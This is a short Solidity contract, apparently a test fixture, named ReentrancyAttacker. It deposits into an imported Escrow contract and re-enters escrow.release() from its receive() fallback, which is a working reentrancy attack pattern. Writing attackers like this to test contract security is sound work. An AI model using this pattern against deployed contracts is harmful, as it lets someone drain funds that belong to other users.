// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import "./Escrow.sol";

contract ReentrancyAttacker {
    Escrow public escrow;

    function setEscrow(address _escrow) external {
        escrow = Escrow(_escrow);
    }

    function deposit() external payable {
        escrow.deposit{value: msg.value}();
    }

    function release() external {
        escrow.release();
    }

    receive() external payable {
        // Re-enter release().
        escrow.release();
    }
}